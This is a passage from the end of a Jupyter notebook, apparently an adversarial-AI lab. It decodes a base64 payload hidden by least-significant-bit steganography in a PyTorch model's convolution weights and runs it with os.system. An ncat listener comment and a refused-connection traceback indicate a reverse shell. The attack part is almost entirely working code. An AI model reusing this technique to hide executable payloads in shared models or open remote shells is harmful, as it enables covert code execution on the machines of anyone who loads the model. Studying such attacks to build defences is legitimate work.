    "    tmp_float = np.append(tmp_float, struct.unpack('@f', struct.pack('@i', value))[0]).astype(np.float32)\n",
    "\n",
    "conv_layer_flat[:tmp_float.size] = tmp_float\n",
    "\n",
    "conv_layer = conv_layer_flat.reshape(conv_layer_shape)\n",
    "\n",
    "conv_layer = torch.as_tensor(data=conv_layer, dtype=torch.float32)\n",
    "model.layer4[0].conv2.weight.data = conv_layer\n",
    "\n",
    "torch.save(obj=model, f=r'/tmp/model_stegoed.pt')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "77f0f383",
   "metadata": {},
   "source": [
    "# Decoding Process"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "id": "a5b7d041",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 127,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import torch\n",
    "import struct\n",
    "import base64\n",
    "import numpy as np\n",
    "import os\n",
    "\n",
    "loaded_model = torch.load(f='/tmp/model_stegoed.pt', map_location='cpu', weights_only=False)\n",
    "\n",
    "conv_layer_to_decode = loaded_model.layer4[0].conv2.weight.data.numpy()\n",
    "conv_layer_to_decode = conv_layer_to_decode.reshape(-1)\n",
    "\n",
    "get_content_length = conv_layer_to_decode[:8]\n",
    "\n",
    "def convert_from_float_to_int(data:np.array=None):\n",
    "    tmp_int = np.array([], dtype=np.int32)\n",
    "    for i in range(len(data)):\n",
    "        tmp_int = np.append(tmp_int, struct.unpack('@i', struct.pack('@f', data[i]))[0])\n",
    "\n",
    "    return tmp_int\n",
    "\n",
    "int_data_from_float = convert_from_float_to_int(get_content_length)\n",
    "\n",
    "def get_lsb_status(int_data:np.array=None):\n",
    "    c = np.array([], dtype=np.int32)\n",
    "    for i in range(len(int_data)):\n",
    "        c = np.append(arr=c, values=int_data[i] % 2).astype(str).tolist()\n",
    "\n",
    "    return c\n",
    "\n",
    "c = get_lsb_status(int_data=int_data_from_float)\n",
    "payload_len_to_decode = int(''.join(c), base=2)\n",
    "\n",
    "payload_to_decode = conv_layer_to_decode[8:payload_len_to_decode*8 + 8]\n",
    "int_data_from_float = convert_from_float_to_int(data=payload_to_decode)\n",
    "get_lsbs = get_lsb_status(int_data=int_data_from_float)\n",
    "\n",
    "def recover_final_data(data:list=[]):\n",
    "    str_array = [get_lsbs[i:i+8  ] for i in range(0, len(get_lsbs), 8)]\n",
    "    bits_joined = [ ''.join(i) for i in str_array ]\n",
    "    b64_payload = ''.join([chr(int(i, base=2)) for i in bits_joined])\n",
    "    data_decoded = base64.b64decode(s=b64_payload)\n",
    "    return data_decoded\n",
    "\n",
    "# Remember to setup your listener\n",
    "# ncat --verbose --listen 9999\n",
    "os.system(command=recover_final_data(data=get_lsbs))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "id": "40ece9f3",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Traceback (most recent call last):\n",
      "  File \"<string>\", line 1, in <module>\n",
      "ConnectionRefusedError: [Errno 111] Connection refused\n"
     ]
    }
   ],
   "source": [
    "### Hope you enjoyed this lab!"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "adversarial_ai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
